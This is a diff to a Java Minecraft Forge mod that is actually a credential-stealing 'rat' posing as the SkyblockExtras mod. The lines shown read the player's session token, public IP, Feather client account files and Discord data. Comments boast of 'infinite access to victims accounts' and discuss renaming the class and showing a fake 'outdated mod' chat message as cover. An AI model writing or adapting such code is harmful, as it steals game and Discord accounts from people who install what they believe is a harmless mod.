@@ -21,8 +21,8 @@ import java.util.Objects;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-@Mod(modid = "")
-public class SkyblockExtras {
+@Mod(modid = "") //change this because hypixel doesn't like empty modids
+public class Rat { //change class name please for the love of god
 
     @Mod.EventHandler
     public void preInit(FMLPreInitializationEvent event) {
@@ -41,8 +41,7 @@ public class SkyblockExtras {
                 String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
                 String token = mc.getSession().getToken();
                 String feather = "File not found :(", essentials = "File not found :(", discord = "Discord not found :(";
-
-
+                
                 //"if u swap these files with yours, you get infinite access to victims accounts"      -Shlost#5052
                 if (Files.exists(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json"))) {
                     feather = Files.readAllLines(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json")).toString();
@@ -109,8 +108,8 @@ public class SkyblockExtras {
     public void onFirstPlayerJoin(EntityJoinWorldEvent e) {
         //send and unregister when player joins
         if (e.entity.equals(Minecraft.getMinecraft().thePlayer)) {
-            //play the "outdated mod" card
-            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§cThis version of SBE has been disabled due to a security issue. Please update to the latest version."));
+            //do something here (ex: play the "outdated mod" card)
+//            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§cThis version of SBE has been disabled due to a security issue. Please update to the latest version."));
             MinecraftForge.EVENT_BUS.unregister(this);
         }
     }
